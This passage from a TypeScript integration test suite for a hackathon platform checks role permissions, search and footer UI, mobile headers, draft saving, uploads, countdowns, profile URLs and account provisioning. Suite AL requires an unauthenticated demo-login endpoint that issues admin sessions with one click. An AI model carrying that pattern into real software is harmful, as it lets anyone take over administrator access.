    const res = await api(`/api/admin/hackathons/${organizerHackathonId}`, {
      method: "PATCH",
      token: ORGANIZER_TOKEN,
      body: {
        tagline: "Updated tagline by organizer role",
      },
    });

    assert.equal(res.status, 200, "Organizer must be authorized to update hackathon");
    assert.equal(res.data?.hackathon?.tagline, "Updated tagline by organizer role");
  });

  test("AB.5. Organizer role CAN delete their hackathon via DELETE /api/admin/hackathons/[id] (HTTP 200)", async () => {
    assert.ok(organizerHackathonId, "Hackathon must exist for DELETE");
    const res = await api(`/api/admin/hackathons/${organizerHackathonId}`, {
      method: "DELETE",
      token: ORGANIZER_TOKEN,
    });

    assert.equal(res.status, 200, "Organizer must be authorized to delete hackathon");
    assert.equal(res.data?.success, true);
    organizerHackathonId = null;
  });

  test("AB.6. Organizer navigating to /admin/settings or /admin/users is redirected", async () => {
    const settingsRes = await fetch(`${BASE_URL}/admin/settings`, {
      headers: { Cookie: `neon-auth.session_token=${ORGANIZER_TOKEN}` },
      redirect: "manual",
    });
    assert.equal(settingsRes.status, 307, "Organizer must be redirected from /admin/settings");
    assert.equal(settingsRes.headers.get("location"), "/");

    const usersRes = await fetch(`${BASE_URL}/admin/users`, {
      headers: { Cookie: `neon-auth.session_token=${ORGANIZER_TOKEN}` },
      redirect: "manual",
    });
    assert.equal(usersRes.status, 307, "Organizer must be redirected from /admin/users");
    assert.equal(usersRes.headers.get("location"), "/");
  });

  test("AB.7. Organizer querying super-admin APIs (/api/admin/users, /api/admin/mail) receives 403 Forbidden", async () => {
    const usersApiRes = await api("/api/admin/users", {
      token: ORGANIZER_TOKEN,
    });
    assert.equal(usersApiRes.status, 403, "Organizer must receive 403 Forbidden on /api/admin/users");

    const mailApiRes = await api("/api/admin/mail", {
      token: ORGANIZER_TOKEN,
    });
    assert.equal(mailApiRes.status, 403, "Organizer must receive 403 Forbidden on /api/admin/mail");
  });
});

describe("Suite AC: Search Filter Reset Button & Popular Tag Suggestions on Empty Search (Change 4)", () => {
  test("AC.1. Empty search results render prominent 'Clear All Filters' button instead of 'Reset Filters'", async () => {
    const res = await fetchHtml("/hackathons?search=NonExistentChallengeXYZ9999", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("No Hackathons Found"),
      "Must display 'No Hackathons Found' heading"
    );
    assert.ok(
      res.text.includes("Clear All Filters"),
      "Must render prominent 'Clear All Filters' button"
    );
    assert.ok(
      !res.text.includes(">Reset Filters<"),
      "Must no longer render old 'Reset Filters' button text"
    );
    assert.ok(
      res.text.includes('href="/hackathons"'),
      "Clear All Filters must link to /hackathons"
    );
  });

  test("AC.2. Empty search results render suggested popular tags (AI, Web3, Next.js, etc.)", async () => {
    const res = await fetchHtml("/hackathons?search=NonExistentChallengeXYZ9999", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Suggested popular tags:"),
      "Must render 'Suggested popular tags:' section"
    );
    assert.ok(
      res.text.includes("AI") && res.text.includes("Web3") && res.text.includes("Next.js"),
      "Must suggest popular tags including AI, Web3, and Next.js"
    );
    assert.ok(
      res.text.includes('href="/hackathons?tag=AI"'),
      "AI suggestion must link to /hackathons?tag=AI"
    );
    assert.ok(
      res.text.includes('href="/hackathons?tag=Web3"'),
      "Web3 suggestion must link to /hackathons?tag=Web3"
    );
  });

  test("AC.3. Empty search with active sorting preserves sort parameter in 'Clear All Filters' and tag suggestions", async () => {
    const res = await fetchHtml("/hackathons?search=NonExistentChallengeXYZ9999&sort=prize", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes('href="/hackathons?sort=prize"'),
      "Clear All Filters button must preserve active sorting (?sort=prize)"
    );
    assert.ok(
      res.text.includes('href="/hackathons?tag=AI&amp;sort=prize"') ||
      res.text.includes('href="/hackathons?tag=AI&sort=prize"'),
      "Suggested tags must preserve active sorting (?tag=AI&sort=prize)"
    );
  });

  test("AC.4. Navigating to suggested tag /hackathons?tag=AI returns matching challenges", async () => {
    const res = await fetchHtml("/hackathons?tag=AI", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Showing") && !res.text.includes("No Hackathons Found"),
      "Navigating to popular tag AI must successfully display hackathon challenges"
    );
  });
});

describe("Suite AD: Site Footer Competition Links Tag Taxonomy Parity (Remove 1)", () => {
  test("AD.1. Footer competition links use ?tag= taxonomy matching database", async () => {
    const res = await fetchHtml("/", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes('href="/hackathons?tag=AI"'),
      "Footer must link AI to /hackathons?tag=AI"
    );
    assert.ok(
      res.text.includes('href="/hackathons?tag=Mobile"'),
      "Footer must link Mobile to /hackathons?tag=Mobile"
    );
    assert.ok(
      res.text.includes('href="/hackathons?tag=DevTools"'),
      "Footer must link DevTools to /hackathons?tag=DevTools"
    );
    assert.ok(
      res.text.includes('href="/hackathons?tag=Web3"'),
      "Footer must link Web3 to /hackathons?tag=Web3"
    );
    assert.ok(
      !res.text.includes('href="/hackathons?track=ai"'),
      "Footer must not contain dead ?track=ai link"
    );
  });

  test("AD.2. Clicking footer ?tag= links successfully resolves hackathon browse page with filters", async () => {
    const [aiRes, mobileRes, devtoolsRes, web3Res] = await Promise.all([
      fetchHtml("/hackathons?tag=AI", null),
      fetchHtml("/hackathons?tag=Mobile", null),
      fetchHtml("/hackathons?tag=DevTools", null),
      fetchHtml("/hackathons?tag=Web3", null),
    ]);

    assert.equal(aiRes.status, 200);
    assert.equal(mobileRes.status, 200);
    assert.equal(devtoolsRes.status, 200);
    assert.equal(web3Res.status, 200);
  });

  test("AD.3. Obsolete mock button 'Judging Rubric Guide' is removed from footer", async () => {
    const res = await fetchHtml("/", null);
    assert.equal(res.status, 200);
    assert.ok(
      !res.text.includes("Judging Rubric Guide"),
      "Footer must not contain obsolete mock button 'Judging Rubric Guide'"
    );
  });
});

describe("Suite AE: Logged Out Header Responsive Button Collapse (Remove 3)", () => {
  test("AE.1. Home page header collapses Sign In button on mobile (hidden sm:inline-flex)", async () => {
    const res = await fetchHtml("/", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/auth/signin">Sign In</a>'),
      "Sign In button must have hidden sm:inline-flex class on home page"
    );
    assert.ok(
      res.text.includes('href="/auth/signin">Get Started</a>'),
      "Get Started button must be present on home page"
    );
  });

  test("AE.2. Hackathons directory header collapses Sign In button on mobile", async () => {
    const res = await fetchHtml("/hackathons", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/auth/signin">Sign In</a>'),
      "Sign In button must have hidden sm:inline-flex class on /hackathons page"
    );
    assert.ok(
      res.text.includes('href="/auth/signin">Get Started</a>'),
      "Get Started button must be present on /hackathons page"
    );
  });

  test("AE.3. Hackathon details header collapses Sign In button on mobile", async () => {
    const res = await fetchHtml(`/hackathons/${hackathonSlug}`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes(`href="/auth/signin?callbackUrl=/hackathons/${hackathonSlug}">Sign In</a>`),
      "Sign In button must have hidden sm:inline-flex class on /hackathons/[slug] page"
    );
    assert.ok(
      res.text.includes(`href="/auth/signin?callbackUrl=/hackathons/${hackathonSlug}">Get Started</a>`),
      "Get Started button must be present on /hackathons/[slug] page"
    );
  });

  test("AE.4. Host onboarding header collapses Sign In button on mobile", async () => {
    const res = await fetchHtml("/host", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/auth/signin">Sign In</a>'),
      "Sign In button must have hidden sm:inline-flex class on /host page"
    );
    assert.ok(
      res.text.includes('href="/auth/signin">Get Started</a>'),
      "Get Started button must be present on /host page"
    );
  });

  test("AE.5. Projects directory header collapses Sign In button on mobile", async () => {
    const res = await fetchHtml("/projects", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/auth/signin">Sign In</a>'),
      "Sign In button must have hidden sm:inline-flex class on /projects page"
    );
    assert.ok(
      res.text.includes('href="/auth/signin">Get Started</a>'),
      "Get Started button must be present on /projects page"
    );
  });
});

describe("Suite AF: Mobile Touch Targets & Header Density (Improve 1)", () => {
  test("AF.1. /hackathons header hides secondary 'Home' button on mobile viewports", async () => {
    const res = await fetchHtml("/hackathons", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/">Home</a>'),
      "Home button must have hidden sm:inline-flex class on /hackathons page"
    );
  });

  test("AF.2. /projects header hides secondary 'Explore Challenges' button on mobile viewports", async () => {
    const res = await fetchHtml("/projects", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/hackathons">Explore Challenges</a>'),
      "Explore Challenges button must have hidden sm:inline-flex class on /projects page"
    );
  });

  test("AF.3. /host header hides secondary 'Explore Challenges' and 'Host an Event' buttons on mobile viewports", async () => {
    const res = await fetchHtml("/host", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/hackathons">Explore Challenges</a>'),
      "Explore Challenges button must have hidden sm:inline-flex class on /host page"
    );
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/host"'),
      "Host an Event button must have hidden sm:inline-flex class on /host page"
    );
  });

  test("AF.4. /users/[id] header hides secondary 'Hackathons' button on mobile viewports", async () => {
    const res = await fetchHtml(`/users/${rivalId}`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hidden sm:inline-flex") && res.text.includes('href="/hackathons"'),
      "Hackathons button must have hidden sm:inline-flex class on /users/[id] page"
    );
  });

  test("AF.5. Headers use compact mobile-safe padding px-4 sm:px-8 preventing horizontal overflow on < 380px screens", async () => {
    const [hackathonsRes, projectsRes, hostRes] = await Promise.all([
      fetchHtml("/hackathons", null),
      fetchHtml("/projects", null),
      fetchHtml("/host", null),
    ]);
    assert.equal(hackathonsRes.status, 200);
    assert.equal(projectsRes.status, 200);
    assert.equal(hostRes.status, 200);

    assert.ok(
      hackathonsRes.text.includes("px-4 sm:px-8"),
      "/hackathons header must use px-4 sm:px-8 padding"
    );
    assert.ok(
      projectsRes.text.includes("px-4 sm:px-8"),
      "/projects header must use px-4 sm:px-8 padding"
    );
    assert.ok(
      hostRes.text.includes("px-4 sm:px-8"),
      "/host header must use px-4 sm:px-8 padding"
    );
  });
});

describe("Suite AG: Form Auto-Save & Draft Persistence (Improve 2)", () => {
  test("AG.1. /hackathons/[slug]/submit includes draft auto-save and persistence client hooks", async () => {
    const res = await fetchHtml(`/hackathons/${hackathonSlug}/submit`, BUILDER_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("hack4win_submission_draft_") || res.text.includes("do4win_submission_draft_") || res.text.includes("Draft auto-saved") || res.text.includes("Discard Draft"),
      "Submission page must include draft auto-save and persistence mechanisms"
    );
  });

  test("AG.2. Source code of submit-project-client implements localStorage/sessionStorage persistence and cleanup", async () => {
    const submitClientSource = await fs.readFile(
      path.resolve(process.cwd(), "src/app/hackathons/[slug]/submit/submit-project-client.tsx"),
      "utf-8"
    );
    assert.ok(
      submitClientSource.includes("DRAFT_STORAGE_KEY"),
      "Must define DRAFT_STORAGE_KEY scoped to hackathon and user"
    );
    assert.ok(
      submitClientSource.includes("localStorage.setItem") || submitClientSource.includes("sessionStorage.setItem"),
      "Must write form draft to localStorage or sessionStorage on change"
    );
    assert.ok(
      submitClientSource.includes("localStorage.getItem") || submitClientSource.includes("sessionStorage.getItem"),
      "Must restore form draft from localStorage or sessionStorage on mount"
    );
    assert.ok(
      submitClientSource.includes("localStorage.removeItem"),
      "Must clear draft from storage upon successful submission and discard"
    );
    assert.ok(
      submitClientSource.includes("handleDiscardDraft"),
      "Must provide a discard draft handler"
    );
  });

  test("AG.3. Form includes draft restore notification banner with Discard Draft action", async () => {
    const submitClientSource = await fs.readFile(
      path.resolve(process.cwd(), "src/app/hackathons/[slug]/submit/submit-project-client.tsx"),
      "utf-8"
    );
    assert.ok(
      submitClientSource.includes("Pitch Draft Restored"),
      "Must display user-friendly Pitch Draft Restored notification"
    );
    assert.ok(
      submitClientSource.includes("Discard Draft"),
      "Must provide a Discard Draft button"
    );
  });
});

describe("Suite AH: Drag-and-Drop File Upload in Project Submission (Improve 3)", () => {
  test("AH.1. /hackathons/[slug]/submit renders screenshot drop-zone with visual border-dashed and hover:border-primary styling", async () => {
    const res = await fetchHtml(`/hackathons/${hackathonSlug}/submit`, BUILDER_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("border-dashed") && res.text.includes("hover:border-primary"),
      "Drop zone must render border-dashed and hover:border-primary styling in rendered HTML"
    );
    assert.ok(
      res.text.includes("Drag &amp; drop image files here or click to browse") ||
      res.text.includes("Drag & drop image files here or click to browse"),
      "Drop zone must provide drag-and-drop instructional label"
    );
  });

  test("AH.2. Source code of submit-project-client implements complete drag-and-drop file upload lifecycle", async () => {
    const submitClientSource = await fs.readFile(
      path.resolve(process.cwd(), "src/app/hackathons/[slug]/submit/submit-project-client.tsx"),
      "utf-8"
    );
    assert.ok(
      submitClientSource.includes("border-dashed") && submitClientSource.includes("hover:border-primary"),
      "Submit client must include border-dashed and hover:border-primary classes"
    );
    assert.ok(
      submitClientSource.includes("isDraggingScreenshots"),
      "Submit client must track active drag-and-drop state"
    );
    assert.ok(
      submitClientSource.includes("onDragOver") &&
      submitClientSource.includes("onDragEnter") &&
      submitClientSource.includes("onDragLeave") &&
      submitClientSource.includes("onDrop"),
      "Submit client must handle all drag-and-drop browser events"
    );
    assert.ok(
      submitClientSource.includes("handleUploadScreenshots"),
      "Submit client must delegate dropped files to handleUploadScreenshots"
    );
  });

  test("AH.3. ImageUploader component implements drag-and-drop drop-zone with border-dashed and hover:border-primary", async () => {
    const uploaderSource = await fs.readFile(
      path.resolve(process.cwd(), "src/components/ui/image-uploader.tsx"),
      "utf-8"
    );
    assert.ok(
      uploaderSource.includes("border-dashed") && uploaderSource.includes("hover:border-primary"),
      "ImageUploader must include border-dashed and hover:border-primary classes"
    );
    assert.ok(
      uploaderSource.includes("isDragging"),
      "ImageUploader must track isDragging state"
    );
    assert.ok(
      uploaderSource.includes("onDragEnter") && uploaderSource.includes("onDragLeave") && uploaderSource.includes("onDrop"),
      "ImageUploader must handle drag-and-drop browser events"
    );
  });
});

describe("Suite AI: Countdown Timer Urgency Animation & Exact Boundary Tooltip (Improve 4)", () => {
  const imminentHackathonSlug = `imminent-hack-${Date.now()}`;
  let imminentHackathonId = "";

  before(async () => {
    // Create an ongoing hackathon ending in 8 hours (< 24 hours)
    const res = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Imminent Urgency Hackathon",
        slug: imminentHackathonSlug,
        tagline: "Final stretch competition ending in under 24 hours",
        description: "Countdown timer urgency verification challenge",
        start_date: new Date(Date.now() - 3600000 * 48).toISOString(),
        end_date: new Date(Date.now() + 3600000 * 8).toISOString(),
        submission_deadline: new Date(Date.now() + 3600000 * 8).toISOString(),
        format: "online",
        prize_pool: "$10,000",
        status: "active",
      },
    });
    assert.equal(res.status, 201);
    imminentHackathonId = res.data.hackathon.id;
  });

  test("AI.1. Source code of horizontal-hackathon-card.tsx implements isUnder24Hours countdown urgency, gentle pulse animation, and exact boundary tooltip", async () => {
    const horizontalCardSource = await fs.readFile(
      path.resolve(process.cwd(), "src/components/hackathon/horizontal-hackathon-card.tsx"),
      "utf-8"
    );
    assert.ok(
      horizontalCardSource.includes("isUnder24Hours") &&
      horizontalCardSource.includes("24 * 60 * 60 * 1000"),
      "Must evaluate isUnder24Hours boundary condition (<= 24 hours)"
    );
    assert.ok(
      horizontalCardSource.includes("animate-pulse"),
      "Must apply animate-pulse urgency animation when deadline is imminent"
    );
    assert.ok(
      horizontalCardSource.includes("Imminent Deadline: Submissions close at"),
      "Must define tooltip explaining imminent deadline with exact time boundary"
    );
    assert.ok(
      horizontalCardSource.includes("title={timeTag.tooltip}"),
      "Must bind title attribute to timeTag.tooltip"
    );
    assert.ok(
      horizontalCardSource.includes("data-testid=\"hackathon-deadline-pill\"") &&
      horizontalCardSource.includes("data-testid=\"urgency-pulse-indicator\""),
      "Must render deadline pill test ID and visual pulsing indicator"
    );
  });

  test("AI.2. Source code of featured-hackathon-card.tsx implements parity with isUnder24Hours urgency and tooltip", async () => {
    const featuredCardSource = await fs.readFile(
      path.resolve(process.cwd(), "src/components/home/featured-hackathon-card.tsx"),
      "utf-8"
    );
    assert.ok(
      featuredCardSource.includes("isUnder24Hours") &&
      featuredCardSource.includes("animate-pulse"),
      "Featured hackathon card must implement isUnder24Hours with animate-pulse"
    );
    assert.ok(
      featuredCardSource.includes("Imminent Deadline: Submissions close at"),
      "Featured hackathon card must implement exact boundary tooltip"
    );
    assert.ok(
      featuredCardSource.includes("title={timeTag.tooltip}"),
      "Featured hackathon card must bind title to timeTag.tooltip"
    );
  });

  test("AI.3. End-to-end /hackathons rendering renders imminent countdown pill with pulse animation and tooltip", async () => {
    const res = await fetchHtml(`/hackathons?search=${imminentHackathonSlug}`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Imminent Urgency Hackathon"),
      "Must render the created imminent hackathon"
    );
    assert.ok(
      res.text.includes("Imminent Deadline: Submissions close at") &&
      res.text.includes("less than 24 hours remaining!"),
      "Rendered HTML must include tooltip with exact boundary and urgency notification"
    );
    assert.ok(
      res.text.includes("animate-pulse"),
      "Rendered HTML must include animate-pulse class on imminent countdown pill"
    );
    assert.ok(
      res.text.includes("Ends in 8 hours") || res.text.includes("Ends in 7 hours") || res.text.includes("Ends in 9 hours"),
      "Rendered countdown text must indicate hours remaining"
    );
  });

  after(async () => {
    if (imminentHackathonId) {
      await sql`DELETE FROM public.hackathons WHERE id = ${imminentHackathonId}::uuid`;
    }
  });
});

describe("Suite AJ: Vanity Profile URL by Username (/u/[username])", () => {
  const vanityUsername = `vanity_${Date.now()}`;
  let vanityUserId = "";

  before(async () => {
    vanityUserId = crypto.randomUUID();
    await sql`
      INSERT INTO neon_auth.user (id, name, email, "emailVerified", role, "createdAt", "updatedAt")
      VALUES (${vanityUserId}::uuid, 'Vanity Hacker', ${`vanity_${Date.now()}@platform.io`}, true, 'user', NOW(), NOW())
      ON CONFLICT DO NOTHING;
    `;
    await sql`
      INSERT INTO public.users (id, name, username, email, email_verified, role, bio, created_at, updated_at)
      VALUES (${vanityUserId}, 'Vanity Hacker', ${vanityUsername}, ${`vanity_${Date.now()}@platform.io`}, true, 'user', 'Building open source tools', NOW(), NOW())
      ON CONFLICT (id) DO UPDATE SET username = ${vanityUsername};
    `;
  });

  after(async () => {
    if (vanityUserId) {
      await sql`DELETE FROM public.users WHERE id = ${vanityUserId}`;
      await sql`DELETE FROM neon_auth.user WHERE id = ${vanityUserId}::uuid`;
    }
  });

  test("AJ.1. Profile page is directly accessible by username via /u/[username] with HTTP 200", async () => {
    const res = await fetchHtml(`/u/${vanityUsername}`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Vanity Hacker"),
      "Profile page must display user's display name"
    );
    assert.ok(
      res.text.includes(`@${vanityUsername}`),
      "Profile page must display user handle with @ prefix"
    );
    assert.ok(
      res.text.includes("Participant Profile"),
      "Profile page header must indicate Participant Profile"
    );
  });

  test("AJ.2. /u/@[username] with leading @ symbol also resolves to HTTP 200", async () => {
    const res = await fetchHtml(`/u/@${vanityUsername}`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Vanity Hacker"),
      "Must resolve profile even when requested with leading @"
    );
    assert.ok(
      res.text.includes(`@${vanityUsername}`),
      "Must display username handle"
    );
  });

  test("AJ.3. Visiting unknown username /u/non_existent_xyz returns HTTP 404", async () => {
    const res = await fetchHtml(`/u/non_existent_user_${Date.now()}`, null);
    assert.equal(res.status, 404);
  });

  test("AJ.4. Canonical link and OpenGraph tags on /u/[username] reference /u/[username]", async () => {
    const res = await fetchHtml(`/u/${vanityUsername}`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes(`/u/${vanityUsername}`),
      "Canonical and meta tags must point to /u/[username]"
    );
    assert.ok(
      res.text.includes("Vanity Hacker"),
      "Title tag must contain user's name"
    );
  });

  test("AJ.5. Query parameters for tabs (/u/[username]?tab=hackathons) render selected tab", async () => {
    const res = await fetchHtml(`/u/${vanityUsername}?tab=hackathons`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Explore Live Challenges") || res.text.includes("Hackathons"),
      "Must render the hackathons tab content on /u/[username]?tab=hackathons"
    );
  });

  test("AJ.6. Existing /users/[id] route continues to work for backward compatibility", async () => {
    const res = await fetchHtml(`/users/${vanityUserId}`, null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Vanity Hacker"),
      "Legacy /users/[id] must continue to resolve and render profile"
    );
  });

  after(async () => {
    if (vanityUserId) {
      await sql`DELETE FROM public.users WHERE id = ${vanityUserId}`;
      await sql`DELETE FROM neon_auth.user WHERE id = ${vanityUserId}::uuid`;
    }
  });
});

describe("Suite AK: Hackathon Card Prize Label Font Size & Highlight Styling", () => {
  test("AK.1. horizontal-hackathon-card.tsx implements enlarged prize label font size and highlighted badge", async () => {
    const cardSource = await fs.readFile(
      path.resolve(process.cwd(), "src/components/hackathon/horizontal-hackathon-card.tsx"),
      "utf-8"
    );
    assert.ok(
      cardSource.includes('data-testid="hackathon-prize-highlight"'),
      "Horizontal card must render dedicated hackathon-prize-highlight test ID"
    );
    assert.ok(
      cardSource.includes("bg-amber-500/10") && cardSource.includes("border-amber-500/30"),
      "Horizontal card must apply vibrant amber highlight badge container"
    );
    assert.ok(
      cardSource.includes("text-xs sm:text-sm font-bold"),
      "Horizontal card must increase prize label font size to text-xs sm:text-sm font-bold"
    );
    assert.ok(
      cardSource.includes("font-black text-amber-600"),
      "Horizontal card must highlight prize amount with font-black and amber text"
    );
  });

  test("AK.2. featured-hackathon-card.tsx implements enlarged prize label font size and highlighted box", async () => {
    const cardSource = await fs.readFile(
      path.resolve(process.cwd(), "src/components/home/featured-hackathon-card.tsx"),
      "utf-8"
    );
    assert.ok(
      cardSource.includes("bg-amber-500/10") && cardSource.includes("border-amber-500/30"),
      "Featured card must apply amber highlight styling to prize box"
    );
    assert.ok(
      cardSource.includes("text-xs sm:text-sm") && cardSource.includes("font-bold"),
      "Featured card must increase font size and weight of Prize Pool label"
    );
  });

  test("AK.3. End-to-end /hackathons rendering renders highlighted prize badge", async () => {
    const res = await fetchHtml("/hackathons", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes('data-testid="hackathon-prize-highlight"'),
      "Rendered HTML must include highlighted prize badge on hackathons directory"
    );
    assert.ok(
      res.text.includes("Prizes:") && res.text.includes("bg-amber-500/10"),
      "Rendered HTML must render prominent prize label with amber highlight styling"
    );
  });
});

describe("Suite AL: Admin Users Page Real User Visibility & Demo Role Accounts", () => {
  test("AL.1. Demo accounts exist for all 4 platform roles (admin, organizer, judge, user)", async () => {
    const res = await api("/api/auth/demo-login", { method: "GET" });
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.data.accounts), "Must return accounts array");
    const roles = res.data.accounts.map((a: any) => a.role);
    assert.ok(roles.includes("admin"), "Demo accounts must include admin");
    assert.ok(roles.includes("organizer"), "Demo accounts must include organizer");
    assert.ok(roles.includes("judge"), "Demo accounts must include judge");
    assert.ok(roles.includes("user"), "Demo accounts must include user");
  });

  test("AL.2. Server-side search API GET /api/admin/users?search=... finds users by email, name, and username", async () => {
    const searchRes = await api("/api/admin/users?search=admin@hack4win.online", {
      method: "GET",
      token: ADMIN_TOKEN,
    });
    assert.equal(searchRes.status, 200);
    assert.ok(searchRes.data.users.length >= 1, "Must find user by email");
    assert.equal(searchRes.data.users[0].email, "admin@hack4win.online");

    const usernameRes = await api("/api/admin/users?search=demo_organizer", {
      method: "GET",
      token: ADMIN_TOKEN,
    });
    assert.equal(usernameRes.status, 200);
    assert.ok(usernameRes.data.users.length >= 1, "Must find user by username");
    assert.equal(usernameRes.data.users[0].username, "demo_organizer");
  });

  test("AL.3. Admin Users Page HTML (/admin/users) renders real user accounts and demo role testing console", async () => {
    const res = await fetchHtml("/admin/users", ADMIN_TOKEN);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Users & Access Control") || res.text.includes("Platform Accounts"),
      "Must render admin users page header"
    );
    assert.ok(
      res.text.includes("Role Testing Console") || res.text.includes("1-Click Switcher"),
      "Must render the Role Testing Console"
    );
    assert.ok(
      res.text.includes("admin@hack4win.online") || res.text.includes("Alex Admin"),
      "Must render admin demo account"
    );
  });

  test("AL.4. Demo login endpoint POST /api/auth/demo-login creates valid session and sets cookies for all roles", async () => {
    for (const role of ["admin", "organizer", "judge", "user"]) {
      const loginRes = await api("/api/auth/demo-login", {
        method: "POST",
        body: { role },
      });
      assert.equal(loginRes.status, 200);
      assert.equal(loginRes.data.success, true);
      assert.equal(loginRes.data.user.role, role);
      assert.ok(loginRes.data.redirectUrl, "Must return redirect URL for role");
    }
  });

  test("AL.5. Sign In page (/auth/signin) renders the 1-click test accounts section for all 4 roles", async () => {
    const res = await fetchHtml("/auth/signin", null);
    assert.equal(res.status, 200);
    assert.ok(
      res.text.includes("Test Accounts (1-Click)"),
      "Sign in page must render Test Accounts (1-Click) section"
    );
    assert.ok(
      res.text.includes("Admin") &&
      res.text.includes("Organizer") &&
      res.text.includes("Judge") &&
      res.text.includes("Builder"),
      "Sign in page must render 1-click buttons for all 4 roles"
    );
  });
});

describe("Suite AM: Multi-Tenant Dedicated Portals & Account Provisioning Hierarchy", () => {
  const createdOrganizerEmail = `new_organizer_${Date.now()}@testorg.com`;
  const createdJudgeEmail = `new_judge_${Date.now()}@testjudge.io`;
  let testHackathonId = "";

  before(async () => {
    // Create an organizer hackathon to test judge assignment
    const hRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ORGANIZER_TOKEN,
      body: {
        title: "Organizer Judge Assignment Sprint",
        slug: `judge-assign-hack-${Date.now()}`,
        tagline: "Testing organizer judge invitation workflow",
        description: "Assigned judges evaluation test",
        format: "online",
        prize_pool: "$5,000",
        start_date: new Date(Date.now() + 86400000 * 2).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 10).toISOString(),
        submission_deadline: new Date(Date.now() + 86400000 * 9).toISOString(),
        status: "active",
      },
    });
    if (hRes.status === 201) {
      testHackathonId = hRes.data.hackathon.id;
    }
  });

  after(async () => {
    if (testHackathonId) {
      await sql`DELETE FROM public.hackathon_judges WHERE hackathon_id = ${testHackathonId}::uuid`;
      await sql`DELETE FROM public.hackathons WHERE id = ${testHackathonId}::uuid`;
    }
    await sql`DELETE FROM public.users WHERE email IN (${createdOrganizerEmail}, ${createdJudgeEmail})`;
    await sql`DELETE FROM neon_auth.user WHERE email IN (${createdOrganizerEmail}, ${createdJudgeEmail})`;
  });

  test("AM.1. Super Admin CAN create Organizer account with email via POST /api/admin/organizers", async () => {
    const res = await api("/api/admin/organizers", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        email: createdOrganizerEmail,
        name: "Test Global Host",
        organization: "TechStars Foundation",
        bio: "Global Hackathon Program Manager",
      },
    });
    assert.equal(res.status, 201);
    assert.equal(res.data.success, true);
    assert.equal(res.data.organizer.role, "organizer");
    assert.equal(res.data.organizer.email, createdOrganizerEmail);
  });

  test("AM.2. Non-admin (builder or unauthenticated) CANNOT create Organizer account (returns 403 / 401)", async () => {
    const builderRes = await api("/api/admin/organizers", {
      method: "POST",
      token: BUILDER_TOKEN,
      body: { email: `forbidden_org_${Date.now()}@test.com` },
    });
    assert.equal(builderRes.status, 403);

    const anonRes = await api("/api/admin/organizers", {
      method: "POST",
      body: { email: `anon_org_${Date.now()}@test.com` },
    });
    assert.equal(anonRes.status, 401);
  });

  test("AM.3. Organizer CAN create/invite Judge account with email via POST /api/organizer/judges", async () => {
    const res = await api("/api/organizer/judges", {
      method: "POST",
      token: ORGANIZER_TOKEN,
      body: {
        email: createdJudgeEmail,
        name: "Dr. Evelyn Turing",
        title: "Senior AI Scientist",
        hackathonId: testHackathonId,
      },
    });
    assert.equal(res.status, 201);
    assert.equal(res.data.success, true);
    assert.equal(res.data.judge.role, "judge");
    assert.equal(res.data.judge.email, createdJudgeEmail);
    assert.equal(res.data.assigned, true);
  });

  test("AM.4. Regular builder CANNOT create/invite Judge accounts (returns 403 Forbidden)", async () => {
    const res = await api("/api/organizer/judges", {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        email: `hacker_judge_${Date.now()}@test.com`,
        name: "Rogue Judge",
      },
    });
    assert.equal(res.status, 403);
  });

  test("AM.5. Dedicated /organizer portal returns HTTP 200 for Organizer and Admin", async () => {
    const orgRes = await fetchHtml("/organizer", ORGANIZER_TOKEN);
    assert.equal(orgRes.status, 200);
    assert.ok(
      orgRes.text.includes("Host Portal") || orgRes.text.includes("Organizer Workspace"),
      "Must render the organizer dashboard"
    );

    const adminRes = await fetchHtml("/organizer", ADMIN_TOKEN);
    assert.equal(adminRes.status, 200);
  });

  test("AM.6. Spelling alias /orgnizer redirects seamlessly to /organizer", async () => {
    const res = await fetch(`http://localhost:3000/orgnizer`, {
      redirect: "manual",
      headers: { Cookie: `neon-auth.session_token=${ORGANIZER_TOKEN}` },
    });
    assert.ok([307, 308, 302, 303].includes(res.status), "Must redirect from /orgnizer");
    const location = res.headers.get("location") || "";
    assert.ok(location.includes("/organizer"), "Redirect location must point to /organizer");
  });

  test("AM.7. Dedicated /judges portal returns HTTP 200 for Judge and Admin", async () => {
    const judgeRes = await fetchHtml("/judges", JUDGE_TOKEN);
    assert.equal(judgeRes.status, 200);
